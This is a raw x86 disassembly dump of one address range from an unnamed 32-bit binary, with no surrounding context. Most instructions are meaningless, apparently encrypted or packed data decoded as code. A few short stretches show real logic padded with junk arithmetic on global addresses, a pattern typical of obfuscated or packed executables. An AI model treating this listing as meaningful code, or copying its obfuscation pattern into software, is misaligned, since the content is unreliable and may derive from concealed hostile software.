  4071e1:	sbb    ebx,DWORD PTR [ecx]
  4071e3:	clc    
  4071e4:	or     BYTE PTR [esi-0x4f287f4e],0x42
  4071eb:	mov    WORD PTR [edi-0x49495925],ss
  4071f1:	mov    DWORD PTR [esi+0x77],eax
  4071f4:	sbb    edx,DWORD PTR [edx-0x1aea5234]
  4071fa:	addr16 adc al,0xc4
  4071fd:	ret    
  4071fe:	mov    ecx,0xff1ccad7
  407203:	js     0x40726b
  407205:	aam    0x1
  407207:	shr    BYTE PTR [edi],1
  407209:	pop    esp
  40720a:	cmp    eax,0xb1790b7d
  40720f:	call   0x92275426
  407214:	mov    ds:0x38937e02,al
  407219:	cli    
  40721a:	(bad)  
  40721b:	out    0xa6,al
  40721d:	nop
  40721e:	cmp    BYTE PTR [eax],ah
  407220:	cmp    esp,DWORD PTR [edx+0x244612d5]
  407226:	pop    edx
  407227:	or     BYTE PTR [ecx],dh
  407229:	(bad)  
  40722a:	jns    0x407294
  40722c:	add    al,0x6d
  40722e:	jle    0x407298
  407230:	jb     0x4071d8
  407232:	push   es
  407233:	rcl    DWORD PTR [ecx+eiz*4-0x1ddc88e1],1
  40723a:	pop    edi
  40723b:	leave  
  40723c:	add    edx,DWORD PTR [ebp+0x33]
  40723f:	popf   
  407240:	mov    dl,0x9
  407242:	in     al,dx
  407243:	enter  0x6923,0x9e
  407247:	sub    bh,al
  407249:	xor    bh,al
  40724b:	sbb    BYTE PTR [ebp-0x62],al
  40724e:	mov    eax,0x945ecc82
  407253:	mov    ds:0xd5b1a6b5,al
  407258:	in     eax,dx
  407259:	jae    0x4071f3
  40725b:	mov    ds:0x83d010b,eax
  407260:	nop
  407261:	mov    eax,ds:0x72eabb2c
  407266:	mov    ds:0xc199deb3,eax
  40726b:	sub    ebx,DWORD PTR [eax]
  40726d:	jae    0x40729e
  40726f:	adc    ecx,DWORD PTR [ebp+0x46]
  407272:	arpl   bx,ax
  407274:	clc    
  407275:	mov    ds:0xe43b93bd,eax
  40727a:	in     al,dx
  40727b:	fimul  WORD PTR [ebx]
  40727d:	cmp    dl,BYTE PTR [edx+ebx*8]
  407280:	mov    WORD PTR [edi+edx*4],gs
  407283:	int    0xf4
  407285:	sahf   
  407286:	xchg   ecx,eax
  407287:	hlt    
  407288:	int3   
  407289:	fmul   DWORD PTR [ebx+0xb]
  40728c:	cld    
  40728d:	dec    eax
  40728e:	out    dx,eax
  40728f:	imul   eax,DWORD PTR [edi-0x63],0x7f05c23
  407296:	jb     0x4072ef
  407298:	imul   edx,DWORD PTR [ebx],0xffffffd5
  40729b:	and    esi,DWORD PTR [edx+edx*4]
  40729e:	sti    
  40729f:	outs   dx,DWORD PTR ds:[esi]
  4072a0:	xchg   edi,eax
  4072a1:	adc    al,0xd0
  4072a3:	xchg   esi,eax
  4072a4:	or     DWORD PTR [ecx+0x7e4464a1],ebx
  4072aa:	dec    ecx
  4072ab:	sub    al,0x7
  4072ad:	sub    eax,0x3f8b928f
  4072b2:	push   edx
  4072b3:	mov    al,ds:0xbd6b0336
  4072b8:	pop    esp
  4072b9:	and    ah,BYTE PTR [esi+0x74]
  4072bc:	mov    ch,0x75
  4072be:	push   0x5d
  4072c0:	and    esi,DWORD PTR [ebp+0x23]
  4072c3:	cdq    
  4072c4:	icebp  
  4072c5:	arpl   WORD PTR [edi+esi*2],ax
  4072c8:	lds    esi,FWORD PTR [esi+0x56c7fde]
  4072ce:	or     al,0x2b
  4072d0:	add    eax,0xb5f627fc
  4072d5:	sar    DWORD PTR [esi+0x275b0e2c],1
  4072db:	pop    ds
  4072dc:	and    edx,DWORD PTR [eax+ebx*4-0x7f]
  4072e0:	dec    DWORD PTR [edi+0x3e]
  4072e3:	aaa    
  4072e4:	repnz dec edx
  4072e6:	jmp    0x798e10b9
  4072eb:	and    al,0x93
  4072ed:	jne    0x407276
  4072ef:	push   cs
  4072f0:	out    0xf7,eax
  4072f2:	mov    eax,0xebdb58f5
  4072f7:	mov    eax,ds:0x6c36bc4a
  4072fc:	stc    
  4072fd:	pop    ebx
  4072fe:	jae    0x40735b
  407300:	sbb    al,0x2a
  407302:	cmp    eax,0xe4d656d0
  407307:	sbb    al,BYTE PTR [ebp+0x6e]
  40730a:	pusha  
  40730b:	or     ecx,DWORD PTR [ecx]
  40730d:	push   esi
  40730e:	pop    ebp
  40730f:	cdq    
  407310:	or     al,0x33
  407312:	xor    eax,0xea8fea65
  407317:	in     al,0x11
  407319:	sub    BYTE PTR ds:0x78755985,ah
  40731f:	sub    ebx,ecx
  407321:	mov    ?,ebp
  407323:	pop    edi
  407324:	call   0x662d:0xd48077ed
  40732b:	fucomi st,st(2)
  40732d:	adc    eax,0xbed91177
  407332:	or     al,0x4c
  407334:	js     0x407386
  407336:	mov    edi,0xedb8f70a
  40733b:	sbb    cl,BYTE PTR [ebx+esi*1-0x17]
  40733f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407340:	retf   0x6299
  407343:	jge    0x4072d4
  407345:	push   esp
  407346:	in     eax,0x8b
  407348:	inc    ebp
  407349:	hlt    
  40734a:	add    DWORD PTR ds:0x42fcd1,0x42e703
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fcfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e70f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	nop
  4073fc:	mov    bh,0x81
  4073fe:	jge    0x4073f7
  407400:	iret   
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x40744b
  407408:	or     edi,DWORD PTR [edx-0x47ddd638]
  40740e:	mov    ebx,0x72b5ae08
  407413:	jne    0x407443
  407415:	stos   BYTE PTR es:[edi],al
  407416:	inc    esp
  407417:	aam    0x6
  407419:	mov    ebp,DWORD PTR [edx]
  40741b:	pop    ebp
  40741c:	(bad)  
  40741d:	pop    eax
  40741e:	mov    ebp,0x3f029f75
  407423:	mov    bh,0xa1
  407425:	adc    esi,edx
  407427:	jns    0x4073f2
  407429:	pop    ss
  40742a:	xchg   edx,eax
  40742b:	rep ins DWORD PTR es:[edi],dx
  40742d:	aad    0x28
  40742f:	push   0xe3758639
  407434:	cli    
  407435:	xor    BYTE PTR [ecx+ecx*4+0x235bee62],ah
  40743c:	or     dh,BYTE PTR [esi-0x31da1939]
  407442:	inc    ecx
  407443:	cmp    bh,dh
  407445:	sbb    DWORD PTR [esi+0x18],esp
  407448:	add    eax,0x3629fdd7
  40744d:	inc    ebp
  40744e:	rol    bh,0x9
  407451:	or     bh,BYTE PTR ds:0xc68f2317
  407457:	sti    
  407458:	jne    0x4074b0
  40745a:	jmp    0xd01f5259
  40745f:	pop    es
  407460:	dec    eax
  407461:	(bad)  
  407462:	aad    0x54
  407464:	xchg   ebp,eax
  407465:	pop    ss
  407466:	(bad)  
  407467:	jmp    0x407410
  407469:	jb     0x4074da
  40746b:	loop   0x407436
  40746d:	lock jle 0x407421
  407470:	sub    al,0xe5
  407472:	and    al,BYTE PTR [ecx+esi*4]
  407475:	pop    ebp
  407476:	mov    BYTE PTR [ebx+0x63b4fcd2],0x8b
  40747d:	xchg   ebx,eax
  40747e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40747f:	test   al,0xeb
  407481:	pop    edx
  407482:	pop    es
  407483:	sar    esi,1
  407485:	xor    al,0x4
  407487:	shl    ah,cl
  407489:	push   eax
  40748a:	mov    bh,0x2a
  40748c:	adc    eax,DWORD PTR ds:0xa1536b6d
  407492:	jmp    0x186f:0x505f5979
  407499:	(bad)  
  40749a:	jl     0x4074d5
  40749c:	xchg   esp,ebx
  40749e:	sub    ch,BYTE PTR [ecx+0x31]
  4074a1:	xor    ch,BYTE PTR [ebx-0x79]
  4074a4:	sbb    bl,BYTE PTR [esi+ecx*2-0x48]
  4074a8:	scas   eax,DWORD PTR es:[edi]
  4074a9:	repnz repz sub DWORD PTR [edi+0xb],edi
  4074ae:	mov    ebp,DWORD PTR [ecx-0x18d378c3]
  4074b4:	pop    ss
  4074b5:	inc    ebx
  4074b6:	js     0x40745d
  4074b8:	popa   
  4074b9:	dec    ebx
  4074ba:	pop    ebx
  4074bb:	ja     0x40745f
  4074bd:	pop    es
  4074be:	mov    eax,0x837fb8c2
  4074c3:	ins    DWORD PTR es:[edi],dx
  4074c4:	lods   al,BYTE PTR ds:[esi]
  4074c5:	pop    esi
  4074c6:	adc    al,0xf3
  4074c8:	mov    ch,0x63
  4074ca:	jg     0x4074d4
  4074cc:	add    al,BYTE PTR [eax+0x4c]
  4074cf:	clc    
  4074d0:	cmp    ebp,0x61
  4074d3:	imul   eax,DWORD PTR [ebp-0x28],0x96c4d821
  4074da:	cmp    dh,BYTE PTR [ebx]
  4074dc:	jp     0x4074e6
  4074de:	add    BYTE PTR [edi],bl
  4074e0:	mov    cl,0xa5
  4074e2:	shr    BYTE PTR [ecx+0x19],cl
  4074e5:	inc    ebp
  4074e6:	inc    ebx
  4074e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074e8:	mov    ds:0x7a2c0097,eax
  4074ed:	sub    bl,bl
  4074ef:	out    dx,eax
  4074f0:	pop    eax
  4074f1:	or     edx,DWORD PTR [ebx]
  4074f3:	sbb    bh,BYTE PTR [edi+0x42250cef]
  4074f9:	mov    dh,0x51
  4074fb:	cmp    al,0x64
  4074fd:	and    DWORD PTR [eax+0x48],0xffffffbb
  407501:	and    DWORD PTR [edx+0x50],esi
  407504:	push   0xffffffe4
  407506:	(bad)  
  407507:	loop   0x4074d1
  407509:	xchg   BYTE PTR [esi+0x3d],al
  40750c:	inc    eax
  40750d:	mov    BYTE PTR ds:[ebp+0x52],0xde
  407512:	ret    0xfcf3
  407515:	dec    eax
  407516:	shl    ch,1
  407518:	xchg   ebx,eax
  407519:	mov    esp,0xfe0b094b
  40751e:	cwde   
  40751f:	retf   
  407520:	and    eax,0x6f2a2647
  407525:	xchg   ecx,eax
  407526:	neg    BYTE PTR ds:0x3a580ed9
  40752c:	pop    DWORD PTR [ebx-0x7474892a]
  407532:	or     esp,DWORD PTR [ecx+0x42001c08]
  407538:	push   edi
  407539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40753a:	sub    BYTE PTR [ebp-0x5dd5efa9],dl
  407540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407541:	inc    esp
  407542:	stc    
  407543:	out    dx,al
  407544:	and    edx,DWORD PTR [eax-0x695574fe]
  40754a:	sbb    bh,BYTE PTR [ecx+0x7c]
  40754d:	pop    ebp
  40754e:	and    al,BYTE PTR [eax-0x70cec118]
  407554:	mov    al,al
  407556:	mov    ds,WORD PTR [esi]
  407558:	pop    ss
  407559:	or     ebp,ecx
  40755b:	xor    dh,BYTE PTR [esi+0x5657732b]
  407561:	or     DWORD PTR [eax-0x14],eax
  407564:	aas    
  407565:	imul   edx,DWORD PTR [edx-0x3562f83e],0x13d11d84
  40756f:	lds    esp,FWORD PTR [ebx+eiz*2+0x50afaf26]
  407576:	jbe    0x4075bf
  407578:	sbb    DWORD PTR [ebx],ebp
  40757a:	lods   eax,DWORD PTR ds:[esi]
  40757b:	jmp    0x6dcd:0xf882aa79
  407582:	cli    
  407583:	sbb    DWORD PTR [ebx-0x12],ebp
  407586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407587:	xchg   ebx,eax
  407588:	inc    edx
  407589:	push   ebx
  40758a:	(bad)  
  40758b:	call   0xe8e57091
  407590:	dec    esp
  407591:	inc    ecx
  407592:	lods   eax,DWORD PTR gs:[esi]
  407594:	cmc    
  407595:	mov    eax,ds:0xdecbde44
  40759a:	sahf   
  40759b:	adc    DWORD PTR [esi+0x49],esp
  40759e:	mul    BYTE PTR [ebx]
  4075a0:	mov    WORD PTR [eax],?
  4075a2:	mov    bh,0xa5
  4075a4:	sbb    BYTE PTR [ecx+0x7f],0x83
  4075a8:	xchg   ecx,eax
  4075a9:	xchg   ebp,eax
  4075aa:	popf   
  4075ab:	sti    
  4075ac:	out    dx,al
  4075ad:	push   edx
  4075ae:	cmp    DWORD PTR [esi-0x16],ebx
  4075b1:	lock les edx,FWORD PTR [ebp+ebx*8-0x3b]
  4075b6:	add    eax,DWORD PTR es:[edi]
  4075b9:	ret    0xf818
  4075bc:	or     DWORD PTR [ebx],0x7d795acb
  4075c2:	lea    esp,[ebx-0x39ca6f6c]
  4075c8:	ret    0xab3d
  4075cb:	mov    edi,0xb393dcbe
  4075d0:	push   eax
  4075d1:	clc    
  4075d2:	push   ebp
  4075d3:	mov    eax,ds:0x38829288
  4075d8:	sti    
  4075d9:	push   edx
  4075da:	pop    eax
  4075db:	fsubr  DWORD PTR [eax+0x67]
  4075de:	es dec ecx
  4075e0:	xchg   ebx,eax
  4075e1:	mov    ebp,0x5ada8059
  4075e6:	mov    dl,0x4e
  4075e8:	lock mov al,0x79
  4075eb:	inc    esp
  4075ec:	loopne 0x407617
  4075ee:	add    al,0x6d
  4075f0:	popa   
  4075f1:	xchg   ebx,eax
  4075f2:	icebp  
  4075f3:	mov    eax,ds:0x36ce0f04
  4075f8:	add    al,0xc2
  4075fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075fb:	pop    edi
  4075fc:	mov    bl,0x94
  4075fe:	sbb    al,0x52
  407600:	push   ebx
  407601:	and    ebx,DWORD PTR [ebx+0x59f2dd12]
  407607:	mov    esp,0xa098c6f8
  40760c:	or     DWORD PTR [edi],eax
  40760e:	scas   eax,DWORD PTR es:[edi]
  40760f:	lock loopne 0x40767d
  407612:	pop    ebp
  407613:	push   0xecd82baf
  407618:	mov    ah,0x58
  40761a:	retf   
  40761b:	push   0x7e1e0061
  407620:	lock jb 0x40764e
  407623:	push   cs
  407624:	lods   al,BYTE PTR ds:[esi]
  407625:	push   ss
  407626:	cdq    
  407627:	and    DWORD PTR es:[ebx+edx*1],ebx
  40762b:	push   edi
  40762c:	out    dx,eax
  40762d:	(bad)  
  40762f:	inc    ebp
  407630:	inc    ebx
  407631:	loope  0x4075eb
  407633:	push   ss
  407634:	fwait
  407635:	sar    DWORD PTR [edi-0x3f],cl
  407638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407639:	mov    al,ds:0x172a14bc
  40763e:	pop    ss
  40763f:	stc    
  407640:	push   eax
  407641:	xlat   BYTE PTR ds:[ebx]
  407642:	sbb    bl,BYTE PTR [ebp+0x55463fad]
  407648:	int    0x68
  40764a:	dec    ebx
  40764b:	pop    edx
  40764c:	out    dx,eax
  40764d:	push   edi
  40764e:	adc    eax,0xb20995ae
  407653:	mov    ds:0xf04e303f,eax
  407658:	jne    0x407687
  40765a:	arpl   cx,si
  40765c:	jg     0x407626
  40765e:	add    ch,BYTE PTR [eax+esi*2-0x2a0eac30]
  407665:	inc    ebp
  407666:	and    edx,ebx
  407668:	xchg   ebp,eax
  407669:	ret    0x8a27
  40766c:	jle    0x4076c5
  40766e:	sbb    edx,0x7397ca01
  407674:	fwait
  407675:	inc    esi
  407676:	inc    esi
  407677:	shl    DWORD PTR fs:[edx],1
  40767a:	mov    ebx,0x8f23739d
  40767f:	or     eax,esp
  407681:	cmp    eax,0x14deb98c
  407686:	adc    eax,ecx
  407688:	xor    ebp,eax
  40768a:	ins    DWORD PTR es:[edi],dx
  40768b:	inc    edx
  40768c:	div    ecx
  40768e:	mov    al,ds:0x7e21eae3
  407693:	loopne 0x4076e3
  407695:	mov    bl,cl
  407697:	sbb    eax,0x5e36b04e
  40769c:	stos   DWORD PTR es:[edi],eax
  40769d:	dec    edi
  40769e:	test   DWORD PTR [ecx+0x5fb10a01],eax
  4076a4:	rcr    DWORD PTR ds:0xa29cf685,0x3e
  4076ab:	stos   DWORD PTR es:[edi],eax
  4076ac:	hlt    
  4076ad:	imul   ah
  4076af:	mov    ds:0x81a9832c,eax
  4076b4:	or     eax,0xe28dfd4
  4076b9:	push   0x114ef301
  4076be:	mov    edi,0xa5afe98b
  4076c3:	jl     0x4076d7
  4076c5:	sbb    BYTE PTR [ebx],dl
  4076c7:	dec    edx
  4076c8:	inc    ecx
  4076c9:	in     eax,dx
  4076ca:	leave  
  4076cb:	into   
  4076cc:	outs   dx,BYTE PTR ds:[esi]
  4076cd:	(bad)  
  4076ce:	(bad)  
  4076cf:	dec    edi
  4076d0:	sub    dh,BYTE PTR [edi]
  4076d2:	sub    al,0x5b
  4076d4:	add    al,0xbc
  4076d6:	cdq    
  4076d7:	int3   
  4076d8:	loop   0x407722
  4076da:	and    eax,0xd1488352
  4076df:	in     al,dx
  4076e0:	push   0x9ca7a1f6
  4076e5:	out    dx,al
  4076e6:	cmp    al,0x39
  4076e8:	mov    WORD PTR [ecx-0x8415da1],ss
  4076ee:	sub    ah,dl
  4076f0:	fucomi st,st(5)
  4076f2:	mov    ah,0x8d
  4076f4:	rol    dl,1
  4076f6:	push   ecx
  4076f7:	jmp    0xf3a2:0x17079477
  4076fe:	mov    ebp,esp
  407700:	pop    ds
  407701:	xchg   ebx,eax
  407702:	inc    ebp
  407703:	or     ebx,DWORD PTR [ecx-0x2c]
  407706:	pop    esi
  407707:	mov    ds:0x4fa90969,al
  40770c:	les    esi,FWORD PTR [edx+0x6b]
  40770f:	pop    eax
  407710:	jge    0x4076d4
  407712:	stos   DWORD PTR es:[edi],eax
  407713:	rcl    al,1
  407715:	push   ds
  407716:	fistp  QWORD PTR [eax+eiz*2]
  407719:	iret   
  40771a:	mov    ebx,0xb692ae78
  40771f:	sahf   
  407720:	cli    
  407721:	cld    
  407722:	mov    ebx,0x5d9fad71
  407727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407728:	retf   0x4714
  40772b:	ror    DWORD PTR [eax-0x2fdeb4c3],cl
  407731:	xchg   edi,eax
  407732:	js     0x407798
  407734:	jmp    0x33dc:0x458b4b36
  40773b:	mov    BYTE PTR [ebx],0xc7
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	sub    BYTE PTR [eax+0x3b],bh
  4077dc:	adc    al,0xa7
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x407862
  4077e6:	enter  0xbd80,0xe6
  4077ea:	cwde   
  4077eb:	out    dx,al
  4077ec:	pop    eax
  4077ed:	fs addr16 xchg edx,eax
  4077f0:	push   ebx
  4077f1:	das    
  4077f2:	aad    0xf
  4077f4:	jnp    0x40783f
  4077f6:	add    eax,0xaa1a3545
  4077fb:	imul   ecx,DWORD PTR [ebx+ecx*2+0x6de42eee],0x791d7df2
  407806:	ja     0x407826
  407808:	or     al,0x1c
  40780a:	test   al,0x34
  40780c:	or     DWORD PTR [ebp+0x6418f50e],0x77
  407813:	fadd   st(2),st
  407815:	int    0xc
  407817:	jecxz  0x40783b
  407819:	xor    bl,BYTE PTR [edx]
  40781b:	or     BYTE PTR [eax+edi*4+0x33caaafe],bh
  407822:	pop    ds
  407823:	mov    DWORD PTR [edi],ecx
  407825:	repz shl BYTE PTR [esp+edi*8-0x74],0x2
  40782b:	sbb    esp,DWORD PTR [ebp-0x29ef971b]
  407831:	fidiv  WORD PTR [edi]
  407833:	aaa    
  407834:	pop    ss
  407835:	add    al,0x44
  407837:	es gs push cs
  40783a:	mov    DWORD PTR [edi],0x97df5151
  407840:	scas   al,BYTE PTR es:[edi]
  407841:	adc    DWORD PTR [ecx-0x59],edi
  407844:	scas   al,BYTE PTR es:[edi]
  407845:	call   0x98ba0fb7
  40784a:	pop    esi
  40784b:	addr16 popf 
  40784d:	or     eax,0x4f03d496
  407852:	pop    ss
  407853:	xor    BYTE PTR [eax-0x32],cl
  407856:	add    al,0xe1
  407858:	xchg   esi,eax
  407859:	push   es
  40785a:	pop    edx
  40785b:	into   
  40785c:	lock dec ecx
  40785e:	sbb    edx,DWORD PTR [ebp+0x221579cc]
  407864:	mov    dl,0xd2
  407866:	xor    ebx,ebx
  407868:	dec    edi
  407869:	pop    es
  40786a:	imul   edx,DWORD PTR [ebx],0xffffff8c
  40786d:	sub    BYTE PTR [edx],dl
  40786f:	pop    ds
  407870:	stc    
  407871:	sbb    ch,bl
  407873:	in     al,0x37
  407875:	mov    ds:0x4c483f39,al
  40787a:	or     DWORD PTR [ecx+0x7c0c8763],ebx
  407880:	dec    ebp
  407881:	add    edx,ecx
  407883:	sbb    DWORD PTR [esi+ecx*8+0x39a92e72],ebp
  40788a:	mov    ebx,esi
  40788c:	pop    ds
  40788d:	jmp    0x29fbc58
  407892:	retf   0x49ae
  407895:	xchg   ebx,eax
  407897:	sbb    al,0xf8
  407899:	imul   esp,DWORD PTR [eax],0xffffffdf
  40789c:	cli    
  40789d:	(bad)  
  40789e:	add    DWORD PTR [ecx+0x1b152a88],ecx
  4078a4:	iret   
  4078a5:	loope  0x40790e
  4078a7:	mov    esi,DWORD PTR [ebp+edi*2+0x65954c6a]
  4078ae:	cli    
  4078af:	sub    eax,0xcf15a5d8
  4078b4:	push   ds
  4078b5:	cmp    ah,BYTE PTR [ebp-0x3a]
  4078b8:	outs   dx,BYTE PTR ds:[esi]
  4078b9:	xchg   esi,eax
  4078ba:	sub    ebp,DWORD PTR [eax-0x2]
  4078bd:	(bad)  
  4078be:	in     al,dx
  4078bf:	adc    ebx,ecx
  4078c1:	jns    0x4078e7
  4078c3:	lock add eax,0xca8dd874
  4078c9:	sbb    al,0xe9
  4078cb:	mov    edi,0x5d857a80
  4078d0:	dec    ebx
  4078d1:	mov    ecx,0xaf126428
  4078d6:	adc    bl,cl
  4078d8:	inc    ebp
  4078d9:	xchg   edx,eax
  4078da:	jnp    0x4078ab
  4078dc:	pop    ebp
  4078dd:	imul   ecx,edi,0x30
  4078e0:	clc    
  4078e1:	neg    BYTE PTR [edi-0x70]
  4078e4:	sub    DWORD PTR [esi],0x7c1f3836
  4078ea:	or     ebx,DWORD PTR [edx+0x11]
  4078ed:	pop    ebx
  4078ee:	adc    bh,BYTE PTR [edx+0x58]
  4078f1:	mov    eax,ds:0x5a898f60
  4078f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078f7:	jo     0x407964
  4078f9:	adc    al,0xdd
  4078fb:	push   ss
  4078fc:	add    al,BYTE PTR [esi-0x6f]
  4078ff:	inc    edx
  407900:	es mov eax,0xeba271cf
  407906:	mov    cs,WORD PTR [ebx]
  407908:	inc    ebp
  407909:	pop    edx
  40790a:	retf   
  40790b:	mov    bl,0xfb
  40790d:	cld    
  40790e:	jbe    0x407973
  407910:	jmp    0xb0b1f9cb
  407915:	ds in  al,0x57
  407918:	test   esi,edx
  40791a:	sub    bh,BYTE PTR [ecx+ebx*1]
  40791d:	add    eax,0xc2bef6e7
  407922:	fild   WORD PTR ds:0x12046697
  407928:	je     0x4078bb
  40792a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40792b:	ja     0x4078d9
  40792d:	js     0x40794d
  40792f:	outs   dx,BYTE PTR ds:[esi]
  407930:	test   BYTE PTR fs:[eax-0x174cfbc1],al
  407937:	dec    edx
  407938:	cli    
  407939:	sub    DWORD PTR [eax+0x5d],0x338c6545
  407940:	lods   al,BYTE PTR ds:[esi]
  407941:	and    eax,0x60b69a2e
  407946:	dec    eax
  407947:	out    0xcb,al
  407949:	out    dx,al
  40794a:	test   eax,0xc933cdbb
  40794f:	and    al,0xdf
  407951:	mov    ds:0x756754e,al
  407956:	std    
  407957:	pop    eax
  407958:	test   BYTE PTR [ebp-0x4a],al
  40795b:	mov    es,WORD PTR [edx]
  40795d:	mov    ecx,0xfc2f4270
  407962:	(bad)  
  407963:	ret    0xb672
  407966:	cdq    
  407967:	cmp    BYTE PTR [eax],cl
  407969:	imul   esi,DWORD PTR [edx],0xfffffff4
  40796c:	adc    edx,DWORD PTR [ebx-0x3c]
  40796f:	and    BYTE PTR [ebp+0x55],0x69
  407973:	fwait
  407974:	add    DWORD PTR [ebp*2+0x2604754],esp
  40797b:	(bad)  
  40797c:	mov    edi,DWORD PTR [ecx+0x4d5e0430]
  407982:	js     0x4079d0
  407984:	repz cmp BYTE PTR [eax-0x2aba0514],ah
  40798b:	jp     0x4079ef
  40798d:	jmp    0x98069cb
  407992:	neg    BYTE PTR [edi-0x2f]
  407995:	pop    eax
  407996:	and    al,0x41
  407998:	inc    esi
  407999:	xchg   edi,eax
  40799a:	loope  0x4079ae
  40799c:	mov    al,0x3a
  40799e:	fcomp  QWORD PTR [ecx-0x6f7540bd]
  4079a4:	adc    al,0xcf
  4079a6:	cmp    BYTE PTR [edx+edx*8+0x15],ch
  4079aa:	pop    esi
  4079ab:	or     DWORD PTR [esi+edx*1-0x5e74ff02],0xffffff9a
  4079b3:	mov    WORD PTR [esi],?
  4079b5:	jb     0x40795e
  4079b7:	stos   BYTE PTR es:[edi],al
  4079b8:	xor    ah,BYTE PTR [eax+0x8]
  4079bb:	loopne 0x407978
  4079bd:	adc    DWORD PTR [edx+0x59],0x38
  4079c1:	add    dh,bl
  4079c3:	cdq    
  4079c4:	enter  0xdf75,0xb2
  4079c8:	sbb    dl,BYTE PTR [ecx+0x62741c72]
  4079ce:	in     eax,0xf6
  4079d0:	inc    ebx
  4079d1:	test   DWORD PTR [edi-0x3127cf74],ecx
  4079d7:	fcmovu st,st(0)
  4079d9:	jno    0x407a20
  4079db:	and    edx,DWORD PTR [ebx+0x178d48f2]
  4079e1:	and    eax,0x406079e6
  4079e6:	pop    ss
  4079e7:	jmp    0xf9ff:0x59f26fd5
  4079ee:	clc    
  4079ef:	xchg   ebp,eax
  4079f0:	xchg   esp,eax
  4079f1:	adc    cl,BYTE PTR ds:0x6da04501
  4079f7:	in     al,0xd4
  4079f9:	or     edx,DWORD PTR [ebx+eiz*1-0x9b58bb5]
  407a00:	fist   DWORD PTR [eax+esi*1-0x65]
  407a04:	cmc    
  407a05:	int    0xdb
  407a07:	mov    dh,0xef
  407a09:	call   0x4aa435f9
  407a0e:	adc    eax,0x667e022c
  407a13:	jmp    0x407a77
  407a15:	out    0x66,eax
  407a17:	cmp    eax,0xac2e00c9
  407a1c:	push   ebp
  407a1d:	pop    ebx
  407a1e:	stos   DWORD PTR es:[edi],eax
  407a1f:	fsub   DWORD PTR [ebp+0x7739e78a]
  407a25:	push   ebx
  407a26:	adc    dh,BYTE PTR [edx]
  407a28:	outs   dx,BYTE PTR ds:[esi]
  407a29:	cmp    esp,edx
  407a2b:	not    al
  407a2d:	sub    al,0xae
  407a2f:	repz mov edi,0xdcbb9414
  407a35:	sub    cl,BYTE PTR [eax]
  407a37:	pop    ds
  407a38:	push   edi
  407a39:	mov    al,ds:0x6a4d3fca
  407a3e:	fiadd  WORD PTR [edi-0x263f3342]
  407a44:	adc    eax,0x9376112
  407a49:	dec    esp
  407a4a:	and    eax,0x5e73515f
